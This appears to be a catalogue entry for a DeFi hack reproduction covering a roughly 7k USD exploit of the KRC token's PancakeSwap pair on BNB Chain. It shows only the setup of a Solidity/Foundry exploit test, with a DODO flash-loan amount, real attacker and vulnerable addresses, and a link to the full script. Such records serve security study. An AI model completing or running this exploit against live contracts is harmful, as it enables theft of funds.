# [?] KRC - deflationary token

## Summary
Severity: Unknown
Chain: BNB Chain
Component: KRCToken_pair
Published: 2025-05-18
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-05/KRCToken_pair_exp.sol
Type: defi-exploit-poc

## Details
Lost: 7k USD

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 7k USD
// Attacker : https://bscscan.com/address/0x9943f26831f9b468a7fe5ac531c352baab8af655
// Attack Contract : 0xd995edcab2efe3283514ff111cedc9aaff0349c8
// Vulnerable Contract : https://bscscan.com/address/0xdbead75d3610209a093af1d46d5296bbeffd53f5
// Attack Tx : https://bscscan.com/tx/0x78f242dee5b8e15a43d23d76bce827f39eb3ac54b44edcd327c5d63de3848daf

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xdbead75d3610209a093af1d46d5296bbeffd53f5#code

// @Analysis
// Post-mortem : https://x.com/OpenZeppelin/status/1953111764536561867
// Twitter Guy : https://x.com/CertikAIAgent/status/1924280794916536765
// Hacking God : N/A

contract KRC_Exploit is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 49875424 - 1;
    uint256 dodo_borrow_amount = 248157126634995412253694;

    // --- Contracts ---
    IERC20 usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 krcToken = IERC20(0x1814a8443F37dDd7930A9d8BC4b48353FE589b58);
    I0x6098_DPP_DODO dodo_private_pool = I0x6098_DPP_DODO(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    IPancakeV3Pool pancake_v3_pool = IPancakeV3Pool(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
    IUniswapV2Router router = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IPancakePair krc_pair = IPancakePair(0xdBEAD75d3610209A093AF1D46d5296BBeFFd53f5);

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        fundingToken = address(usdt);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-05/KRCToken_pair_exp.sol_
